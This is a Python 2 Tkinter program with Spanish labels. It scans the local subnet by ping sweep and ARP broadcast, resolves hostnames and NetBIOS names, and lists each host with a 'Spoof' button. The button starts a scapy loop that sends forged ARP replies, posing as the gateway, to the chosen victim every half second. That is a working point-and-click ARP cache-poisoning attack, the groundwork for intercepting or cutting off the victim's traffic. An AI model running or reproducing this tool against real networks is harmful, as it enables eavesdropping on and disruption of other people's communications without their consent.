import netifaces
import multiprocessing
import subprocess
from Tkinter import *
from ttk import *
from scapy.all import *
import time

interfaces = {}

def addr2bin(addr):
	binary = ""
	for num in addr.split("."):
		b = str(bin(int(num))).split("b")[1]
		binary += "0"*(8-len(b))+b
	return binary

def bin2addr(bin):
	addr = []
	for n in range(0,32,8):
		addr.append(str(int(bin[n:n+8],2)))
	return ".".join(addr)

def red(ip,mask):
	ip_bin = addr2bin(ip)
	mask_bin = addr2bin(mask)
	red_bin = ""
	for x,y in zip(ip_bin,mask_bin):
		red_bin += "1" if x == y == "1" else "0"
	return bin2addr(red_bin)

def broadcast(red,mask):
	red_bin = addr2bin(red)
	mask_num = addr2bin(mask).count("1")
	broadcast_bin = red_bin[0:mask_num]+"1"*(32-mask_num)
	return bin2addr(broadcast_bin)

def get_hostname(ip,gw,send_end):
	lista_names = []
	try:
		answer = subprocess.check_output(["nslookup",ip,gw])
		if re.findall("name =(.+)",answer):
			name = re.findall("name =(.+)",answer)[0].replace(" ","")
			lista_names.append(name)
		else:
			lista_names.append("Unknow")

	except:
		lista_names.append("Unknow")
	try:
		nmblookup = subprocess.check_output(["nmblookup","-A",ip])
		if re.findall("(.+)<00>",nmblookup):
			name_nmb = re.findall("(.+)<00>",nmblookup)[0].replace(" ","").replace("\t","")
			lista_names.append(name_nmb)
		else:
			lista_names.append("Unknow")
	except:
		lista_names.append("Unknow")

	send_end.send(lista_names)

def ping_hosts(red,broadcast):
	lista_procesos = []
	pipe_list = []
	ip_l = red.split(".")
	broadcast_l = broadcast.split(".")
	ip_l[3] = str(int(ip_l[3])+1)
	while ip_l != broadcast_l:
		recv_end, send_end = multiprocessing.Pipe(False)
		p = multiprocessing.Process(target=ping_h, args=(".".join(ip_l),send_end))
		lista_procesos.append(p)
		pipe_list.append(recv_end)
		p.start()
		for n in range(4):
			if ip_l[n] == "255":
				for n in range(4)[n:4]:
					ip_l[n] = "0"
				ip_l[n-1] = str(int(ip_l[n-1])+1)
		ip_l[3] = str(int(ip_l[3])+1)
	for proc in lista_procesos:
		proc.join()
	results = [x.recv() for x in pipe_list]
	return [x for x in results if x]

def ping_h(ip,send_end):
	#reply = sr1(IP(dst=ip, ttl=20)/ICMP(),timeout=1,verbose=0)
	ping = subprocess.Popen(["ping","-c 1",ip],stdout=PIPE,stderr=PIPE,stdin=PIPE)
	ping_read = ping.stdout.read()
	if re.findall("(\d) received",ping_read):
		reply = int(re.findall("(\d) received",ping_read)[0])
	else:
		reply = False
	if reply:
		send_end.send(ip)
	else:
		send_end.send(False)
		
def init():
	global interfaces
	if __name__ == "__main__":
		if 2 in netifaces.gateways():
			gateways = netifaces.gateways()[2]
		else:
			print "No gateway"
			return 0

		gateways_iff = [x[1] for x in gateways if x[2] == True]

		for iff in netifaces.interfaces():	
			addrs = netifaces.ifaddresses(iff)
			interfaces[iff] = {}
			if 17 in addrs:
				interfaces[iff]["mac"] = addrs[17][0]["addr"]
			if 2 in addrs:
				interfaces[iff]["ip"] = addrs[2][0]["addr"]
				interfaces[iff]["mask"] = addrs[2][0]["netmask"]
			if iff in gateways_iff:
				interfaces[iff]["gateway"] = [x for x in gateways if x[2] == True and iff == x[1]][0][0]

		interfaces = {iff:interfaces[iff] for iff in interfaces 
				if iff != "lo" and len(interfaces[iff].values()) == 4}

		for iff in interfaces:
			ip = interfaces[iff]["ip"]
			mask = interfaces[iff]["mask"]
			interfaces[iff]["red"] = red(ip,mask)
			interfaces[iff]["broadcast"] = broadcast(interfaces[iff]["red"],mask)

		if interfaces:
			app = App()
		else:	
			print "No Network configuration"
			return 0

def func_spoof(ip_v,gw,mac):
	arpfake = ARP()
	arpfake.op = 2
	arpfake.psrc = gw
	arpfake.pdst = ip_v
	arpfake.hwdst = mac
	arpfake.show()
	while 1:
		send(arpfake,verbose=0)
		time.sleep(0.5)

class InfoInterfaces():
	def __init__(self,master):
		interface_label = Label(master.frame,text="Interface:")
		interface_label.grid(column=0,row=0,padx=5,pady=5,sticky=W)

		Style().configure("Red.TCombobox", foreground="darkred")

		self.combobox = Combobox(master.frame,state="readonly",width=15,style="Red.TCombobox")
		self.combobox["values"] = [x for x in interfaces]
		self.combobox.grid(column=1,row=0,padx=5,pady=5,sticky=W)
		self.combobox.current(0)
		self.combobox.bind("<<ComboboxSelected>>", self.iface_selec)

		self.interface_selec = self.combobox["values"][self.combobox.current()]
		self.mac = interfaces[self.interface_selec]["mac"]
		self.ip = interfaces[self.interface_selec]["ip"]
		self.mask = interfaces[self.interface_selec]["mask"]
		self.num_mask = str(addr2bin(self.mask).count("1"))
		self.gateway = interfaces[self.interface_selec]["gateway"]
		self.red = interfaces[self.interface_selec]["red"]
		self.broadcast = interfaces[self.interface_selec]["broadcast"]

		self.mac_label =  Entry(master.frame)
		self.mac_label.insert(0,self.mac)
		self.mac_label.config(state="readonly")

		self.ip_label =  Entry(master.frame)
		self.ip_label.insert(0,self.ip)
		self.ip_label.config(state="readonly")

		self.mask_label = Entry(master.frame)
		self.mask_label.insert(0,self.mask)
		self.mask_label.config(state="readonly")

		self.num_mask_label = Entry(master.frame)
		self.num_mask_label.insert(0,"/"+self.num_mask)
		self.num_mask_label.config(state="readonly")

		self.gateway_label = Entry(master.frame)
		self.gateway_label.insert(0,self.gateway)
		self.gateway_label.config(state="readonly")

		self.red_label = Entry(master.frame)
		self.red_label.insert(0,self.red)
		self.red_label.config(state="readonly")

		self.broadcast_label = Entry(master.frame)
		self.broadcast_label.insert(0,self.broadcast)
		self.broadcast_label.config(state="readonly")

		Label(master.frame,text="MAC:").grid(column=0,row=1,padx=5,pady=5,sticky=W)
		Label(master.frame,text="IP:").grid(column=0,row=2,padx=5,pady=5,sticky=W)
		Label(master.frame,text="NetMask:").grid(column=0,row=3,padx=5,pady=5,sticky=W)
		Label(master.frame,text="Gateway:").grid(column=0,row=4,padx=5,pady=5,sticky=W)
		Label(master.frame,text="Network:").grid(column=0,row=5,padx=5,pady=5,sticky=W)
		Label(master.frame,text="Broadcast:").grid(column=0,row=6,padx=5,pady=5,sticky=W)

		self.mac_label.grid(column=1,row=1,padx=5,pady=5,sticky=W)
		self.ip_label.grid(column=1,row=2,padx=5,pady=5,sticky=W)
		self.mask_label.grid(column=1,row=3,padx=5,pady=5,sticky=W)
		self.gateway_label.grid(column=1,row=4,padx=5,pady=5,sticky=W)
		self.red_label.grid(column=1,row=5,padx=5,pady=5,sticky=W)
		self.broadcast_label.grid(column=1,row=6,padx=5,pady=5,sticky=W)

		self.num_mask_label.grid(column=2,row=3,padx=5,pady=5,sticky=W)

		self.escanear = Button(master.frame,text="Escanear",command=master.escaneo)
		self.escanear.grid(column=1,row=7,padx=5,pady=10,sticky=W)

	def write_entry(self,entry,text):
		entry.config(state="normal")
		entry.delete(0,END)
		entry.insert(0,text)
		entry.config(state="readonly")

	def iface_selec(self,event):
		if self.interface_selec in netifaces.interfaces():
			info_interface = netifaces.ifaddresses(self.interface_selec)
			if 2 in info_interface and 17 in info_interface:
				self.interface_selec = self.combobox["values"][self.combobox.current()]
				self.mac = interfaces[self.interface_selec]["mac"]
				self.ip = interfaces[self.interface_selec]["ip"]
				self.mask = interfaces[self.interface_selec]["mask"]
				self.num_mask = str(addr2bin(self.mask).count("1"))
				self.gateway = interfaces[self.interface_selec]["gateway"]
				self.red = interfaces[self.interface_selec]["red"]
				self.broadcast = interfaces[self.interface_selec]["broadcast"]

				self.write_entry(self.mac_label,self.mac)
				self.write_entry(self.ip_label,self.ip)
				self.write_entry(self.mask_label,self.mask)
				self.write_entry(self.num_mask_label,"/"+self.num_mask)
				self.write_entry(self.gateway_label,self.gateway)
				self.write_entry(self.red_label,self.red)
				self.write_entry(self.broadcast_label,self.broadcast)
			else:
				print "Error. Bad interface configuration"
		else:
			print "Error. No interface"

class Host():
	def __init__(self,master,ip,mac,hostname,netbios,n_r):

		Style().configure("Red.TButton", foreground="darkred")
		Style().configure("Black.TButton", foreground="black")
		Style().configure("Red.TEntry", foreground="darkred")
		Style().configure("Black.TEntry", foreground="black")

		self.ip = ip
		self.mac = mac
	
		self.label_ip_host = Entry(master.frame_equipos)
		self.label_ip_host.insert(0,self.ip)
		self.label_ip_host.config(state="readonly")

		self.label_mac_host = Entry(master.frame_equipos)
		self.label_mac_host.insert(0,self.mac)
		self.label_mac_host.config(state="readonly")

		self.label_hostname = Entry(master.frame_equipos)
		self.label_hostname.insert(0,hostname)
		self.label_hostname.config(state="readonly")

		self.label_netbios = Entry(master.frame_equipos)
		self.label_netbios.insert(0,netbios)
		self.label_netbios.config(state="readonly")

		self.button_spoof = Button(master.frame_equipos,text="Spoof",command=lambda: self.spoof(master,self.ip,self.mac))

		self.label_ip_host.grid(row=n_r,column=0,padx=5,pady=5,sticky=W+E)
		self.label_mac_host.grid(row=n_r,column=1,padx=5,pady=5,sticky=W+E)
		self.label_hostname.grid(row=n_r,column=2,padx=5,pady=5,sticky=W+E)
		self.label_netbios.grid(row=n_r,column=3,padx=5,pady=5,sticky=W+E)
		self.button_spoof.grid(row=n_r,column=4,padx=5,pady=5,sticky=W+E)

		self.proceso = None

	def spoof(self,master,ip,mac):
		#style = Style()
		#Style().configure("Red.TButton", foreground="darkred")
		#Style().configure("Black.TButton", foreground="black")
		if self.proceso:
			self.button_spoof.config(text="Spoof")
			self.button_spoof.config(style="Black.TButton")
			self.label_ip_host.config(style="Black.TEntry")
			self.label_mac_host.config(style="Black.TEntry")
			self.label_hostname.config(style="Black.TEntry")
			self.label_netbios.config(style="Black.TEntry")
			self.proceso.terminate()
			self.proceso = False
			print "Stop ARP Spoofing to", ip, mac
		else:
			self.button_spoof.config(style="Red.TButton")
			self.button_spoof.config(text="Spoofing")
			self.label_ip_host.config(style="Red.TEntry")
			self.label_mac_host.config(style="Red.TEntry")
			self.label_hostname.config(style="Red.TEntry")
			self.label_netbios.config(style="Red.TEntry")
			gw = master.Iinterfaces.gateway
			mac = master.Iinterfaces.mac
			self.proceso = multiprocessing.Process(target=func_spoof,args=(self.ip,gw,mac))
			self.proceso.start()
			print "ARP Spoofing to ", ip, mac
		
class App():
	def __init__(self):
		self.root = Tk()
		self.frame = Frame(borderwidth=2,relief="groove")
		self.frame.grid(row=0,column=0,columnspan=2,sticky=W+E,padx=5,pady=5)

		self.Iinterfaces = InfoInterfaces(self)

		self.canvas = Canvas(self.root, bd=0, highlightthickness=0)		
		self.frame_equipos = Frame(self.canvas)
		yscroll = Scrollbar(self.root,orient=VERTICAL,command=self.canvas.yview)
		self.canvas.configure(yscrollcommand=yscroll.set)

		self.frame_equipos.bind("<Configure>",self.onFrameConfigure)

		self.canvas.bind('<Configure>', self.FrameWidth)

		self.canvas.grid(row=1,column=0,sticky=N+W+E+S,padx=5,pady=5)
		self.canvas_frame = self.canvas.create_window((0,0),window=self.frame_equipos, anchor=N)
		yscroll.grid(row=1,column=1, sticky=N+S+E, pady=5, padx=3)

		self.equipos_escaneo = []
		self.hosts = []
		
		self.root.resizable(width=True,height=True)
		self.root.minsize(width=600, height=400)

		self.root.rowconfigure(1, weight=1)
		self.root.columnconfigure(0, weight=1)

		self.frame_equipos.columnconfigure(0,weight=1)
		self.frame_equipos.columnconfigure(1,weight=1)
		self.frame_equipos.columnconfigure(2,weight=5)
		self.frame_equipos.columnconfigure(3,weight=5)

		self.root.mainloop()
	
	def onFrameConfigure(self, event):
		canvas_height = self.canvas.winfo_height()
		frame_equipos_height = event.height
		self.canvas.configure(scrollregion=self.canvas.bbox("all"))
		#if canvas_height > frame_equipos_height:
		#	self.canvas.itemconfig(self.canvas_frame, height=canvas_height-5)
		#else:
		#	self.canvas.itemconfig(self.canvas_frame, height=(len(self.frame_equipos.winfo_children())/4)*40)

	def FrameWidth(self, event):
		canvas_width = event.width-10
		self.canvas.itemconfig(self.canvas_frame, width = canvas_width)

	def show_arp_table(self,arp_scan_list):
		lista_hosts = []
		arp_table = subprocess.check_output(["arp"])
		arp_table = arp_table.split("\n")
		arp_table = arp_table[1:len(arp_table)]
		for host in arp_table:
			h_list = host.split()
			if len(h_list) == 5 and h_list[4] == self.Iinterfaces.interface_selec:
				lista_hosts.append([h_list[0],h_list[2]])
		for host in arp_scan_list:
			if not host in lista_hosts:
				lista_hosts.append(host)
		return lista_hosts

	def escaneo(self):
		self.equipos_escaneo = []
		self.hosts = []
		if self.frame_equipos.winfo_children():
			for widget in self.frame_equipos.winfo_children():
    				widget.destroy()
		print "Escaneando "+self.Iinterfaces.combobox["values"][self.Iinterfaces.combobox.current()]+"...."

		print "Ping SCAN:",ping_hosts(self.Iinterfaces.red,self.Iinterfaces.broadcast)

		pdst_ip = self.Iinterfaces.ip+"/"+self.Iinterfaces.num_mask
		alive,dead=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=pdst_ip), timeout=1, verbose=0)
		hosts_list_scan = []
		for i in range(0,len(alive)):
			ip = alive[i][1].psrc
			mac = alive[i][1].hwsrc
			hosts_list_scan.append([ip,mac])
		hosts_list_final = self.show_arp_table(hosts_list_scan)
		print "ARP Scan:", hosts_list_final
		pipe_list = []
		procesos_gethost = []
		gw = self.Iinterfaces.gateway
		for host in hosts_list_final:
			ip = host[0]
			mac = host[1]
			if ip != gw:
				self.equipos_escaneo.append([ip,mac])
				recv_end, send_end = multiprocessing.Pipe(False)
				p = multiprocessing.Process(target=get_hostname,args=(ip,gw,send_end))
				procesos_gethost.append(p)
				pipe_list.append(recv_end)
				p.start()
		if procesos_gethost:
			p_n = 0
			for proc in procesos_gethost:
				procesos_gethost[p_n].join()
				p_n += 1
			Label(self.frame_equipos,text="IP",relief="groove").grid(row=0,column=0, sticky=W+E, pady=5, padx=3)
			Label(self.frame_equipos,text="MAC",relief="groove").grid(row=0,column=1, sticky=W+E, pady=5, padx=3)
			Label(self.frame_equipos,text="Hostname",relief="groove").grid(row=0,column=2, sticky=W+E, pady=5, padx=3)
			Label(self.frame_equipos,text="NetBIOS",relief="groove").grid(row=0,column=3, sticky=W+E, pady=5, padx=3)
			n_r = 0
			for equipo in self.equipos_escaneo:
				list_names = pipe_list[n_r].recv()
				hostname,netbios = list_names
				self.hosts.append(Host(self,equipo[0],equipo[1],hostname,netbios,n_r+1))
				n_r += 1
		print "Escaneo Finalizado."

init()
		
